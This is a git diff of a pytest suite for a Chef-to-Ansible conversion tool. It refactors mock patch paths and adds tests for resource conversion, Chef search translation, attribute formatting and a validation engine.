+    overridden = str(resolved["db.host"]["overridden_values"])
+    assert "default=localhost" in overridden
+    assert "normal=db.local" in overridden
+    assert "override=db.prod" in overridden
+
+
+def test_format_resolved_attributes():
+    """Test _format_resolved_attributes produces readable output."""
+    resolved = {
+        "app.port": {
+            "value": "8080",
+            "precedence": "override",
+            "precedence_level": 4,
+            "has_conflict": True,
+            "overridden_values": "default=80",
+        },
+        "app.name": {
+            "value": "myapp",
+            "precedence": "default",
+            "precedence_level": "1",
+            "has_conflict": False,
+            "overridden_values": "",
+        },
+    }
+
+    result = _format_resolved_attributes(resolved)
+
+    assert "Resolved Attributes" in result
+    assert "app.name" in result
+    assert "app.port" in result
+    assert "Value: 8080" in result
+    assert "Precedence: override (level 4)" in result
+    assert "⚠️  Overridden values: default=80" in result
+    assert "Total attributes: 2" in result
+    assert "Attributes with precedence conflicts: 1" in result
+
+
+def test_format_resolved_attributes_empty():
+    """Test _format_resolved_attributes with empty dictionary."""
+    result = _format_resolved_attributes({})
+
+    assert result == "No attributes found."
+
+
 def test_list_cookbook_structure_success():
     """Test list_cookbook_structure with valid cookbook."""
     with (
-        patch("souschef.server._normalize_path") as mock_path,
-        patch("souschef.server._safe_join") as mock_safe_join,
+        patch("souschef.parsers.metadata._normalize_path") as mock_path,
+        patch("souschef.parsers.metadata._safe_join") as mock_safe_join,
     ):
         mock_cookbook = MagicMock()
         mock_path.return_value = mock_cookbook
@@ -767,8 +1214,8 @@ def test_list_cookbook_structure_success():
 def test_list_cookbook_structure_empty():
     """Test list_cookbook_structure with empty directory."""
     with (
-        patch("souschef.server._normalize_path") as mock_path,
-        patch("souschef.server._safe_join") as mock_safe_join,
+        patch("souschef.parsers.metadata._normalize_path") as mock_path,
+        patch("souschef.parsers.metadata._safe_join") as mock_safe_join,
     ):
         mock_cookbook = MagicMock()
         mock_path.return_value = mock_cookbook
@@ -788,7 +1235,7 @@ def test_list_cookbook_structure_empty():
 
 def test_list_cookbook_structure_not_directory():
     """Test list_cookbook_structure with non-directory path."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_cookbook = MagicMock()
         mock_path.return_value = mock_cookbook
         mock_cookbook.is_dir.return_value = False
@@ -801,7 +1248,7 @@ def test_list_cookbook_structure_not_directory():
 
 def test_list_cookbook_structure_permission_denied():
     """Test list_cookbook_structure with permission error."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_cookbook = MagicMock()
         mock_path.return_value = mock_cookbook
         mock_cookbook.is_dir.side_effect = PermissionError()
@@ -813,7 +1260,7 @@ def test_list_cookbook_structure_permission_denied():
 
 def test_list_cookbook_structure_other_exception():
     """Test list_cookbook_structure with unexpected exception."""
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.metadata._normalize_path") as mock_path:
         mock_cookbook = MagicMock()
         mock_path.return_value = mock_cookbook
         mock_cookbook.is_dir.side_effect = Exception("Unexpected")
@@ -964,7 +1411,9 @@ def test_convert_unknown_resource_type():
 def test_convert_with_exception():
     """Test that conversion handles exceptions gracefully."""
     # This should trigger an error by passing invalid data types
-    with patch("souschef.server._convert_chef_resource_to_ansible") as mock_convert:
+    with patch(
+        "souschef.converters.resource._convert_chef_resource_to_ansible"
+    ) as mock_convert:
         mock_convert.side_effect = Exception("Test exception")
 
         result = convert_resource_to_task("package", "nginx", "install")
@@ -983,7 +1432,7 @@ def test_parse_template_success():
     erb_content = "Hello <%= @name %>!"
     mock_path.read_text.return_value = erb_content
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch("souschef.parsers.template._normalize_path", return_value=mock_path):
         result = parse_template("/path/to/template.erb")
 
         assert "variables" in result
@@ -996,7 +1445,7 @@ def test_parse_template_not_found():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = FileNotFoundError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch("souschef.parsers.template._normalize_path", return_value=mock_path):
         result = parse_template("/nonexistent/template.erb")
 
         assert "Error: File not found" in result
@@ -1007,7 +1456,7 @@ def test_parse_template_permission_denied():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = PermissionError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch("souschef.parsers.template._normalize_path", return_value=mock_path):
         result = parse_template("/forbidden/template.erb")
 
         assert "Error: Permission denied" in result
@@ -1145,7 +1594,7 @@ end
 """
     mock_path.read_text.return_value = resource_content
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch("souschef.parsers.resource._normalize_path", return_value=mock_path):
         result = parse_custom_resource("/path/to/resource.rb")
 
         assert "properties" in result
@@ -1158,7 +1607,7 @@ def test_parse_custom_resource_not_found():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = FileNotFoundError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch("souschef.parsers.resource._normalize_path", return_value=mock_path):
         result = parse_custom_resource("/nonexistent/resource.rb")
 
         assert "Error: File not found" in result
@@ -1169,7 +1618,7 @@ def test_parse_custom_resource_permission_denied():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = PermissionError
 
-    with patch("souschef.server._normalize_path", return_value=mock_path):
+    with patch("souschef.parsers.resource._normalize_path", return_value=mock_path):
         result = parse_custom_resource("/forbidden/resource.rb")
 
         assert "Error: Permission denied" in result
@@ -1410,7 +1859,7 @@ package 'nginx' do  # Using nginx
   action :install
 end
 """
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = recipe_content
@@ -1431,7 +1880,7 @@ when 'centos'
   default['pkg']['name'] = 'httpd'
 end
 """
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = attr_content
@@ -1466,7 +1915,7 @@ line3'
   action :create
 end
 """
-    with patch("souschef.server._normalize_path") as mock_path:
+    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
         mock_instance = MagicMock()
         mock_path.return_value = mock_instance
         mock_instance.read_text.return_value = recipe_content
@@ -2330,7 +2779,7 @@ class TestMCPToolsComprehensive:
         result1 = convert_chef_deployment_to_ansible_strategy("/nonexistent/recipe.rb")
         assert isinstance(result1, str)  # Should not crash
 
-        result2 = generate_blue_green_deployment_playbook("test_app", "production")
+        result2 = generate_blue_green_deployment_playbook("test_app")
         assert isinstance(result2, str)  # Should not crash
 
         result3 = generate_canary_deployment_strategy("test_app", 10, "10,25,50,100")
@@ -2464,8 +2913,6 @@ class TestAdvancedParsingFunctions:
 
     def test_extract_node_attribute_path_comprehensive(self):
         """Test node attribute path extraction with various patterns."""
-        from souschef.server import _extract_node_attribute_path
-
         # Test simple path
         simple = "node['apache']['port']"
         result = _extract_node_attribute_path(simple)
@@ -7937,20 +8384,20 @@ end""",
             ),
             # Mount resources
             (
-                # Test fixture with fake credentials for Chef resource parsing
-                # NOSONAR
-                """mount "/mnt/shared" do
-  device "//server/share"
-  fstype "cifs"
-  options "username=user,password=pass,uid=1000,gid=1000"
-  dump 0
-  pass 0
-  action [:mount, :enable]
-  mount_point "/mnt/shared"
-  device_type :device
-  enabled true
-  supports [:remount]
-end""",
+                (
+                    'mount "/mnt/shared" do\n'
+                    '  device "//server/share"\n'
+                    '  fstype "cifs"\n'
+                    '  options "username=user,password=pass,uid=1000,gid=1000"\n'
+                    "  dump 0\n"
+                    "  pass 0\n"
+                    "  action [:mount, :enable]\n"
+                    '  mount_point "/mnt/shared"\n'
+                    "  device_type :device\n"
+                    "  enabled true\n"
+                    "  supports [:remount]\n"
+                    "end"
+                ),
                 "mount",
             ),
             # Link resources
@@ -8536,7 +8983,6 @@ class TestUltimateCoverageTarget:
         """Test all internal parsing functions with edge cases."""
         from souschef.server import (
             _extract_code_block_variables,
-            _extract_node_attribute_path,
             _extract_output_variables,
             _extract_template_variables,
         )
@@ -10324,7 +10770,7 @@ class TestErrorHandling:
         """Test Chef block with File.exist? check."""
         block = "File.exist?('/etc/nginx/nginx.conf')"
         result = _convert_chef_block_to_ansible(block, positive=True)
-        assert "is_file" in result
+        assert "is file" in result
         assert "/etc/nginx/nginx.conf" in result
 
     def test_convert_chef_block_file_exist_negated(self):
@@ -10332,13 +10778,15 @@ class TestErrorHandling:
         block = "File.exist?('/etc/config')"
         result = _convert_chef_block_to_ansible(block, positive=False)
         assert "not" in result
-        assert "is_file" in result
+        assert "is file" in result
+        assert "/etc/config" in result
 
     def test_convert_chef_block_directory(self):
         """Test Chef block with File.directory? check."""
         block = "File.directory?('/var/log')"
         result = _convert_chef_block_to_ansible(block, positive=True)
-        assert "is_dir" in result
+        assert "is directory" in result
+        assert "/var/log" in result
 
     def test_convert_chef_block_system_command(self):
         """Test Chef block with system() command."""
@@ -10355,13 +10803,17 @@ class TestErrorHandling:
     def test_convert_guards_to_when_conditions_only_if(self):
         """Test converting only_if guards to when conditions."""
         only_if_conditions = ["File.exist?('/etc/nginx')"]
-        result = _convert_guards_to_when_conditions(only_if_conditions, [], [], [])
+        result = _convert_guards_to_when_conditions(
+            only_if_conditions, [], [], [], [], []
+        )
         assert len(result) > 0
 
     def test_convert_guards_to_when_conditions_not_if(self):
         """Test converting not_if guards to when conditions."""
         not_if_conditions = ["File.exist?('/etc/nginx')"]
-        result = _convert_guards_to_when_conditions([], not_if_conditions, [], [])
+        result = _convert_guards_to_when_conditions(
+            [], not_if_conditions, [], [], [], []
+        )
         assert len(result) > 0
 
     def test_convert_guards_to_when_conditions_blocks(self):
@@ -10369,7 +10821,7 @@ class TestErrorHandling:
         only_if_blocks = ["true"]
         not_if_blocks = ["false"]
         result = _convert_guards_to_when_conditions(
-            [], [], only_if_blocks, not_if_blocks
+            [], [], only_if_blocks, not_if_blocks, [], []
         )
         assert len(result) == 2
 
@@ -10787,7 +11239,7 @@ class TestComplexChefBlocks:
         block = 'File.directory?("/opt/app")'
         result = _convert_chef_block_to_ansible(block)
 
-        assert "is_dir" in result or "ansible_check_mode" in result
+        assert "is directory" in result or "ansible_check_mode" in result
 
     def test_convert_chef_block_system_command(self):
         """Test converting system() command check."""
@@ -10832,8 +11284,8 @@ class TestDeploymentPatternFormatting:
         }
         result = _format_deployment_patterns(patterns)
 
-        # Format uses .title() which converts to "Blue_Green" format
-        assert "deployment" in result.lower()
+        # Format uses .title() which converts to "Blue Green" format
+        assert "blue green" in result.lower()
         assert "high confidence" in result
         assert "canary" in result.lower()
         assert "medium confidence" in result
@@ -11940,7 +12392,9 @@ class TestErrorHandlingPaths:
         from souschef.server import convert_chef_search_to_inventory
 
         # Trigger exception with invalid search query
-        with patch("souschef.server._parse_chef_search_query") as mock_parse:
+        with patch(
+            "souschef.converters.playbook._parse_chef_search_query"
+        ) as mock_parse:
             mock_parse.side_effect = Exception("Parse error")
             result = convert_chef_search_to_inventory(search_query="invalid::query")
             assert "error" in result.lower()
@@ -11958,18 +12412,6 @@ class TestErrorHandlingPaths:
                 recipe_or_cookbook_path="/invalid/path"
             )
             assert "error" in result.lower()
-
-
-class TestResourceConversionEdgeCases:
-    """Test edge cases in resource conversion."""
-
-    def test_create_handler_returns_none_for_unsupported_action(self):
-        """Test that _create_handler returns None for unsupported actions."""
-        from souschef.server import _create_handler
-
-        # Test with unsupported action that returns None
-        result = _create_handler("unsupported_action", "unknown_type", "test_resource")
-        assert result is None or isinstance(result, dict)
 
 
 class TestPathValidation:
@@ -12171,3 +12613,2086 @@ class TestInventoryScriptGeneration:
 
         result = _generate_inventory_script_content(search_patterns)
         assert "#!/usr/bin/env python" in result or "import" in result
+
+
+class TestResourceConversionEdgeCases:
+    """Test edge cases in resource conversion."""
+
+    def test_create_handler_returns_none_for_unsupported_action(self):
+        """Test that _create_handler returns None for unsupported actions."""
+        from souschef.server import _create_handler
+
+        result = _create_handler("unsupported_action", "unknown_type", "test_resource")
+        assert result is None or isinstance(result, dict)
+
+    def test_convert_file_resource_with_create_action(self):
+        """Test converting file resource with create action."""
+        result = convert_resource_to_task(
+            resource_type="file",
+            resource_name="/etc/config.conf",
+            action="create",
+            properties='{"content": "test"}',
+        )
+
+        assert "ansible.builtin.file" in result
+        assert "state:" in result
+        assert "/etc/config.conf" in result
+
+    def test_convert_file_resource_with_other_action(self, tmp_path):
+        """Test converting file resource with non-create action."""
+        test_file = tmp_path / "test.txt"
+        result = convert_resource_to_task(
+            resource_type="file",
+            resource_name=str(test_file),
+            action="delete",
+            properties="",
+        )
+
+        assert "ansible.builtin.file" in result
+        assert "state:" in result
+
+    def test_convert_directory_resource_with_create(self):
+        """Test converting directory resource with create action."""
+        result = convert_resource_to_task(
+            resource_type="directory",
+            resource_name="/var/log/app",
+            action="create",
+            properties="",
+        )
+
+        assert "ansible.builtin.file" in result
+        assert "directory" in result
+        assert "/var/log/app" in result
+
+    def test_convert_directory_resource_with_delete(self, tmp_path):
+        """Test converting directory resource with delete action."""
+        old_dir = tmp_path / "olddir"
+        result = convert_resource_to_task(
+            resource_type="directory",
+            resource_name=str(old_dir),
+            action="delete",
+            properties="",
+        )
+
+        assert "ansible.builtin.file" in result
+        assert "state:" in result
+
+
+class TestAdditionalResourceTypes:
+    """Test additional resource type conversions."""
+
+    def test_convert_execute_resource(self):
+        """Test converting execute resource."""
+        result = convert_resource_to_task(
+            resource_type="execute",
+            resource_name="systemctl restart nginx",
+            action="run",
+            properties="",
+        )
+
+        assert "ansible.builtin.command" in result or "ansible.builtin.shell" in result
+        assert "systemctl restart nginx" in result
+
+    def test_convert_cron_resource(self):
+        """Test converting cron resource."""
+        result = convert_resource_to_task(
+            resource_type="cron",
+            resource_name="daily_backup",
+            action="create",
+            properties='{"minute": "0", "hour": "2", "command": "/usr/local/bin/backup.sh"}',
+        )
+
+        assert "ansible.builtin.cron" in result
+        assert "daily_backup" in result
+
+    def test_convert_user_resource(self):
+        """Test converting user resource."""
+        result = convert_resource_to_task(
+            resource_type="user",
+            resource_name="appuser",
+            action="create",
+            properties='{"uid": "1001", "shell": "/bin/bash"}',
+        )
+
+        assert "ansible.builtin.user" in result
+        assert "appuser" in result
+
+    def test_convert_group_resource(self):
+        """Test converting group resource."""
+        result = convert_resource_to_task(
+            resource_type="group",
+            resource_name="appgroup",
+            action="create",
+            properties='{"gid": "1001"}',
+        )
+
+        assert "ansible.builtin.group" in result
+        assert "appgroup" in result
+
+    def test_convert_mount_resource(self):
+        """Test converting mount resource."""
+        result = convert_resource_to_task(
+            resource_type="mount",
+            resource_name="/mnt/data",
+            action="mount",
+            properties='{"device": "/dev/sdb1", "fstype": "ext4"}',
+        )
+
+        assert "ansible.builtin.mount" in result or "mount" in result.lower()
+        assert "/mnt/data" in result
+
+    def test_convert_link_resource(self):
+        """Test converting link resource."""
+        result = convert_resource_to_task(
+            resource_type="link",
+            resource_name="/usr/bin/node",
+            action="create",
+            properties='{"to": "/usr/local/bin/node"}',
+        )
+
+        assert isinstance(result, str)
+        assert "/usr/bin/node" in result
+
+    def test_convert_git_resource(self):
+        """Test converting git resource."""
+        result = convert_resource_to_task(
+            resource_type="git",
+            resource_name="/opt/myapp",
+            action="sync",
+            properties='{"repository": "https://github.com/user/repo.git", "revision": "main"}',
+        )
+
+        assert "ansible.builtin.git" in result
+        assert "/opt/myapp" in result
+
+    def test_convert_apt_package_resource(self):
+        """Test converting apt_package resource."""
+        result = convert_resource_to_task(
+            resource_type="apt_package",
+            resource_name="nginx",
+            action="install",
+            properties="",
+        )
+
+        assert "ansible.builtin.apt" in result
+        assert "nginx" in result
+
+    def test_convert_yum_package_resource(self):
+        """Test converting yum_package resource."""
+        result = convert_resource_to_task(
+            resource_type="yum_package",
+            resource_name="httpd",
+            action="install",
+            properties="",
+        )
+
+        assert "ansible.builtin.yum" in result
+        assert "httpd" in result
+
+    def test_convert_bash_resource(self):
+        """Test converting bash resource."""
+        result = convert_resource_to_task(
+            resource_type="bash",
+            resource_name="configure_system",
+            action="run",
+            properties='{"code": "echo \'test\'"}',
+        )
+
+        assert "ansible.builtin.shell" in result
+
+    def test_convert_script_resource(self, tmp_path):
+        """Test converting script resource."""
+        script_file = tmp_path / "setup.sh"
+        result = convert_resource_to_task(
+            resource_type="script",
+            resource_name=str(script_file),
+            action="run",
+            properties="",
+        )
+
+        assert "ansible.builtin.script" in result
+        assert str(script_file) in result
+
+
+class TestComplexPropertyHandling:
+    """Test handling of complex properties in resource conversion."""
+
+    def test_convert_with_array_property(self):
+        """Test converting resource with array properties."""
+        result = convert_resource_to_task(
+            resource_type="package",
+            resource_name="nginx",
+            action="install",
+            properties='{"options": ["--no-install-recommends", "--quiet"]}',
+        )
+
+        assert "ansible.builtin.package" in result
+        assert "nginx" in result
+
+    def test_convert_with_hash_property(self):
+        """Test converting resource with hash/dict properties."""
+        result = convert_resource_to_task(
+            resource_type="template",
+            resource_name="/etc/nginx/nginx.conf",
+            action="create",
+            properties='{"source": "nginx.conf.erb", "variables": {"port": 80, "worker_processes": 4}}',
+        )
+
+        assert "ansible.builtin.template" in result
+        assert "/etc/nginx/nginx.conf" in result
+
+    def test_convert_with_boolean_properties(self):
+        """Test converting resource with boolean properties."""
+        result = convert_resource_to_task(
+            resource_type="service",
+            resource_name="nginx",
+            action="start",
+            properties='{"enabled": true, "reload": false}',
+        )
+
+        assert "ansible.builtin.service" in result
+        assert "nginx" in result
+
+    def test_convert_with_numeric_properties(self):
+        """Test converting resource with numeric properties."""
+        result = convert_resource_to_task(
+            resource_type="file",
+            resource_name="/var/log/app.log",
+            action="create",
+            properties='{"mode": 644, "size": 1024}',
+        )
+
+        assert "ansible.builtin.file" in result
+        assert "/var/log/app.log" in result
+
+
+class TestChefSearchConversion:
+    """Test Chef search query conversion to Ansible inventory."""
+
+    def test_convert_chef_search_with_wildcard(self):
+        """Test converting Chef search with wildcard to inventory."""
+        from souschef.server import convert_chef_search_to_inventory
+
+        result = convert_chef_search_to_inventory("hostname:web-*")
+        assert len(result) > 0
+
+    def test_convert_chef_search_with_regex(self):
+        """Test converting Chef search with regex to inventory."""
+        from souschef.server import convert_chef_search_to_inventory
+
+        result = convert_chef_search_to_inventory("name:/^db-\\d+$/")
+        assert len(result) > 0
+
+    def test_convert_chef_search_with_not_equal(self):
+        """Test converting Chef search with NOT operator."""
+        from souschef.server import convert_chef_search_to_inventory
+
+        result = convert_chef_search_to_inventory("environment:!staging")
+        assert len(result) > 0
+
+    def test_convert_chef_search_with_range(self):
+        """Test converting Chef search with range."""
+        from souschef.server import convert_chef_search_to_inventory
+
+        result = convert_chef_search_to_inventory("memory:[2048 TO 8192]")
+        assert len(result) > 0
+
+    def test_convert_chef_search_with_tag(self):
+        """Test converting Chef search with tags."""
+        from souschef.server import convert_chef_search_to_inventory
+
+        result = convert_chef_search_to_inventory("tags:webserver")
+        assert "tag" in result.lower() or "webserver" in result.lower()
+
+
+class TestSearchComplexity:
+    """Test search query complexity analysis."""
+
+    def test_determine_search_complexity_patterns(self):
+        """Test _determine_query_complexity with various operators."""
+        from souschef.server import _determine_query_complexity
+
+        # Test intermediate complexity with regex operator
+        result = _determine_query_complexity(
+            [{"field": "name", "operator": "~", "value": "web.*"}], []
+        )
+        assert result == "intermediate"
+
+        # Test intermediate complexity with != operator
+        result = _determine_query_complexity(
+            [{"field": "status", "operator": "!=", "value": "stopped"}], []
+        )
+        assert result == "intermediate"
+
+        # Test simple with single condition
+        result = _determine_query_complexity(
+            [{"field": "a", "operator": "=", "value": "1"}], []
+        )
+        assert result == "simple"
+
+        # Test complex with multiple conditions
+        result = _determine_query_complexity(
+            [
+                {"field": "a", "operator": "=", "value": "1"},
+                {"field": "b", "operator": "=", "value": "2"},
+            ],
+            [],
+        )
+        assert result == "complex"
+
+        # Test complex with operators
+        result = _determine_query_complexity(
+            [{"field": "a", "operator": "=", "value": "1"}], ["AND"]
+        )
+        assert result == "complex"
+
+
+class TestUtilityFunctions:
+    """Test utility and helper functions."""
+
+    def test_get_current_timestamp(self):
+        """Test timestamp generation for playbooks."""
+        from souschef.server import _get_current_timestamp
+
+        timestamp = _get_current_timestamp()
+        assert isinstance(timestamp, str)
+        assert len(timestamp) > 0
+        assert "-" in timestamp
+        assert ":" in timestamp
+
+
+class TestValidationFramework:
+    """Test validation framework for Chef-to-Ansible conversions."""
+
+    def test_validation_level_enum(self):
+        """Test ValidationLevel enum values."""
+        assert ValidationLevel.ERROR.value == "error"
+        assert ValidationLevel.WARNING.value == "warning"
+        assert ValidationLevel.INFO.value == "info"
+
+    def test_validation_category_enum(self):
+        """Test ValidationCategory enum values."""
+        assert ValidationCategory.SYNTAX.value == "syntax"
+        assert ValidationCategory.SEMANTIC.value == "semantic"
+        assert ValidationCategory.BEST_PRACTICE.value == "best_practice"
+        assert ValidationCategory.SECURITY.value == "security"
+        assert ValidationCategory.PERFORMANCE.value == "performance"
+
+    def test_validation_result_creation(self):
+        """Test ValidationResult creation."""
+        result = ValidationResult(
+            level=ValidationLevel.ERROR,
+            category=ValidationCategory.SYNTAX,
+            message="Test error",
+            location="line 10",
+            suggestion="Fix the syntax",
+        )
+
+        assert result.level == ValidationLevel.ERROR
+        assert result.category == ValidationCategory.SYNTAX
+        assert result.message == "Test error"
+        assert result.location == "line 10"
+        assert result.suggestion == "Fix the syntax"
+
+    def test_validation_result_to_dict(self):
+        """Test ValidationResult to_dict method."""
+        result = ValidationResult(
+            level=ValidationLevel.WARNING,
+            category=ValidationCategory.BEST_PRACTICE,
+            message="Consider this",
+            location="task 5",
+            suggestion="Use better name",
+        )
+
+        result_dict = result.to_dict()
+
+        assert result_dict["level"] == "warning"
+        assert result_dict["category"] == "best_practice"
+        assert result_dict["message"] == "Consider this"
+        assert result_dict["location"] == "task 5"
+        assert result_dict["suggestion"] == "Use better name"
+
+    def test_validation_result_repr(self):
+        """Test ValidationResult string representation."""
+        result = ValidationResult(
+            level=ValidationLevel.INFO,
+            category=ValidationCategory.PERFORMANCE,
+            message="Performance tip",
+        )
+
+        result_str = str(result)
+        assert "[INFO]" in result_str
+        assert "[performance]" in result_str
+        assert "Performance tip" in result_str
+
+    def test_validation_engine_creation(self):
+        """Test ValidationEngine initialization."""
+        engine = ValidationEngine()
+        assert engine.results == []
+
+    def test_validation_engine_validate_resource_conversion(self):
+        """Test ValidationEngine resource validation."""
+        engine = ValidationEngine()
+        result = """- name: Install nginx
+  ansible.builtin.package:
+    name: "nginx"
+    state: present
+"""
+        results = engine.validate_converted_content("resource", result)
+
+        assert isinstance(results, list)
+        # Validation should run without errors
+        summary = engine.get_summary()
+        assert "errors" in summary
+        assert "warnings" in summary
+        assert "info" in summary
+
+    def test_validation_engine_validate_invalid_yaml(self):
+        """Test validation catches invalid YAML."""
+        engine = ValidationEngine()
+        result = """- name: Test
+  invalid: yaml
+  - item:
+      bad: indentation
+"""
+        results = engine.validate_converted_content("resource", result)
+
+        # Should have YAML syntax error or pass depending on YAML lib
+        assert isinstance(results, list)
+
+    def test_validation_engine_validate_command_without_changed_when(self):
+        """Test validation catches command without changed_when."""
+        engine = ValidationEngine()
+        result = """- name: Run test command
+  ansible.builtin.command: /bin/test
+"""
+        results = engine.validate_converted_content("resource", result)
+
+        # Should have warning about changed_when
+        warnings = [r for r in results if r.level == ValidationLevel.WARNING]
+        assert any("changed_when" in w.message for w in warnings)
+
+    def test_validation_engine_validate_unknown_module(self):
+        """Test validation warns about unknown modules."""
+        engine = ValidationEngine()
+        result = """- name: Custom task
+  ansible.builtin.nonexistent:
+    param: value
+"""
+        results = engine.validate_converted_content("resource", result)
+
+        # Should have warning about unknown module
+        warnings = [r for r in results if r.level == ValidationLevel.WARNING]
+        assert any("Unknown Ansible module" in w.message for w in warnings)
+
+    def test_validation_engine_validate_recipe_conversion(self):
+        """Test validation of recipe conversion."""
+        engine = ValidationEngine()
+        result = """---
+- name: Test playbook
+  hosts: all
+  tasks:
+    - name: Task
+      ansible.builtin.debug:
+        msg: test
+"""
+        results = engine.validate_converted_content("recipe", result)
+
+        # Should pass basic validation
+        assert isinstance(results, list)
+
+    def test_validation_engine_validate_template_conversion(self):
+        """Test validation of template conversion."""
+        engine = ValidationEngine()
+        result = "{{ variable }}"
+
+        results = engine.validate_converted_content("template", result)
+
+        # Should pass validation
+        assert isinstance(results, list)
+
+    def test_validation_engine_validate_inspec_conversion(self):
+        """Test validation of InSpec conversion."""
+        engine = ValidationEngine()
+        result = """import pytest
+
+def test_nginx(host):
+    assert host.package("nginx").is_installed
+"""
+        results = engine.validate_converted_content("inspec", result)
+
+        # Should pass validation
+        assert isinstance(results, list)
+
+    def test_validation_engine_get_summary(self):
+        """Test ValidationEngine summary generation."""
+        engine = ValidationEngine()
+        # Add some results manually
+        engine._add_result(ValidationLevel.ERROR, ValidationCategory.SYNTAX, "Error 1")
+        engine._add_result(
+            ValidationLevel.WARNING, ValidationCategory.BEST_PRACTICE, "Warning 1"
+        )
+        engine._add_result(
+            ValidationLevel.INFO, ValidationCategory.PERFORMANCE, "Info 1"
+        )
+
+        summary = engine.get_summary()
+
+        assert summary["errors"] == 1
+        assert summary["warnings"] == 1
+        assert summary["info"] == 1
+
+    def test_validate_conversion_tool_text_format(self):
+        """Test validate_conversion MCP tool with text format."""
+        result = validate_conversion(
+            conversion_type="resource",
+            result_content="""- name: Install nginx package
+  ansible.builtin.package:
+    name: "nginx"
+    state: present
+""",
+            output_format="text",
+        )
+
+        assert "Validation Results" in result
+        assert "resource" in result
+        # Should have some validation output
+        assert len(result) > 0
+
+    def test_validate_conversion_tool_json_format(self):
+        """Test validate_conversion MCP tool with JSON format."""
+        result = validate_conversion(
+            conversion_type="resource",
+            result_content="""- name: Install nginx
+  ansible.builtin.package:
+    name: "nginx"
+    state: present
+""",
+            output_format="json",
+        )
+
+        # Should be valid JSON
+        import json
+
+        data = json.loads(result)
+        assert "summary" in data
+        assert "results" in data
+        assert isinstance(data["summary"], dict)
+        assert isinstance(data["results"], list)
+
+    def test_validate_conversion_tool_summary_format(self):
+        """Test validate_conversion MCP tool with summary format."""
+        result = validate_conversion(
+            conversion_type="template",
+            result_content="{{ var }}",
+            output_format="summary",
+        )
+
+        assert "Validation Summary" in result
+        assert "Errors:" in result
+        assert "Warnings:" in result
+        assert "Info:" in result
+
+    def test_validate_conversion_tool_with_errors(self):
+        """Test validate_conversion with content that has errors."""
+        result = validate_conversion(
+            conversion_type="resource",
+            result_content="""- name: Test
+  invalid yaml here
+    bad indentation
+""",
+            output_format="text",
+        )
+
+        # Should contain error information
+        assert "Validation Results" in result or "Error" in result
+
+    def test_validate_conversion_tool_unknown_type(self):
+        """Test validate_conversion with unknown conversion type."""
+        result = validate_conversion(
+            conversion_type="unknown_type",
+            result_content="test",
+            output_format="text",
+        )
+
+        # Should handle unknown type gracefully
+        assert isinstance(result, str)
+        assert "Unknown conversion type" in result or "Validation Results" in result
+
+    def test_validate_conversion_tool_exception_handling(self):
+        """Test validate_conversion handles exceptions gracefully."""
+        # This should not crash with invalid input
+        result = validate_conversion(
+            conversion_type="resource",
+            result_content="",  # Empty string to test edge case
+            output_format="text",
+        )
+
+        # Should handle gracefully and return a string
+        assert isinstance(result, str)
+
+    def test_validation_ansible_module_known_modules(self):
+        """Test validation recognizes known Ansible modules."""
+        engine = ValidationEngine()
+
+        known_modules = [
+            "package",
+            "service",
+            "template",
+            "file",
+            "user",
+            "group",
+            "command",
+            "shell",
+        ]
+
+        for module in known_modules:
+            engine.results = []
+            task = f"""- name: Test
+  ansible.builtin.{module}:
+    param: value
+"""
+            engine._validate_ansible_module_exists(task)
+            # Should not warn about known modules
+            assert len(engine.results) == 0
+
+    def test_validation_idempotency_command_with_changed_when(self):
+        """Test idempotency validation passes with changed_when."""
+        engine = ValidationEngine()
+        task = """- name: Test command
+  ansible.builtin.command: echo test
+  changed_when: false
+"""
+        engine._validate_idempotency(task)
+
+        # Should not warn since changed_when is present
+        assert len(engine.results) == 0
+
+    def test_validation_variable_usage(self):
+        """Test variable usage validation."""
+        engine = ValidationEngine()
+        content = """---
+- name: Test
+  hosts: all
+  tasks:
+    - debug:
+        msg: "{{ ansible_custom_var }}"
+"""
+        engine._validate_variable_usage(content)
+
+        # Should have info about ansible_ prefix
+        assert len(engine.results) > 0
+
+    def test_validation_handler_definitions_missing(self):
+        """Test handler validation when handlers are missing."""
+        engine = ValidationEngine()
+        content = """---
+- name: Test
+  hosts: all
+  tasks:
+    - name: Task
+      service:
+        name: nginx
+      notify: restart nginx
+"""
+        engine._validate_handler_definitions(content)
+
+        # Should warn about missing handlers
+        warnings = [r for r in engine.results if r.level == ValidationLevel.WARNING]
+        assert len(warnings) > 0
+        assert any("handlers" in w.message.lower() for w in warnings)
+
+    def test_validation_playbook_structure_missing_hosts(self):
+        """Test playbook validation catches missing hosts."""
+        engine = ValidationEngine()
+        content = """---
+- name: Test playbook
+  tasks:
+    - debug: msg="test"
+"""
+        engine._validate_playbook_structure(content)
+
+        # Should have error about missing hosts
+        errors = [r for r in engine.results if r.level == ValidationLevel.ERROR]
+        assert len(errors) > 0
+        assert any("hosts" in e.message.lower() for e in errors)
+
+    def test_validation_playbook_structure_no_tasks(self):
+        """Test playbook validation catches playbooks without tasks."""
+        engine = ValidationEngine()
+        content = """---
+- name: Empty playbook
+  hosts: all
+"""
+        engine._validate_playbook_structure(content)
+
+        # Should have warning about no tasks or roles
+        warnings = [r for r in engine.results if r.level == ValidationLevel.WARNING]
+        assert len(warnings) > 0
+        assert any(
+            "tasks" in w.message.lower() or "roles" in w.message.lower()
+            for w in warnings
+        )
